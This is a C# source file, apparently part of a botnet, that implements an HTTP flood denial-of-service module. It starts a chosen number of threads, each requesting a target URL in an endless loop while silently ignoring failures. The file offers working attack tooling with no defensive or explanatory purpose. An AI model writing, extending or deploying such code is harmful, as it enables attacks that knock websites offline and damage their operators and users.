using System.Net;
using System.Threading;

namespace BotNet.DDoS
{
    internal static class HttpFlood
    {
        private static Thread[] floodingThread;
        public static string Host;
        public static int ThreadCount;

        public static void StartHTTPFlood()
        {
            floodingThread = new Thread[ThreadCount];
            ThreadStart[] floodingJob = new ThreadStart[ThreadCount];
            HTTPRequest[] requestClass = new HTTPRequest[ThreadCount];

            if (!Host.StartsWith("http://"))
            {
                Host = "http://" + Host;
            }

            for (int i = 0; i < ThreadCount; i++)
            {
                requestClass[i] = new HTTPRequest(Host);
                floodingJob[i] = new ThreadStart(requestClass[i].Send);
                floodingThread[i] = new Thread(floodingJob[i]);
                floodingThread[i].Start();
            }
        }

        public static void StopHTTPFlood()
        {
            for (int i = 0; i < ThreadCount; i++)
            {
                try
                {
                    floodingThread[i].Abort();
                    floodingThread[i].Join();
                }
                catch
                {
                }
            }
        }

        private class HTTPRequest
        {
            private string sFHost;
            private WebClient wHTTP = new WebClient();

            public HTTPRequest(string tHost)
            {
                this.sFHost = tHost;
            }

            public void Send()
            {
                while (true)
                {
                    try
                    {
                        wHTTP.DownloadString(sFHost);
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
        }
    }
}
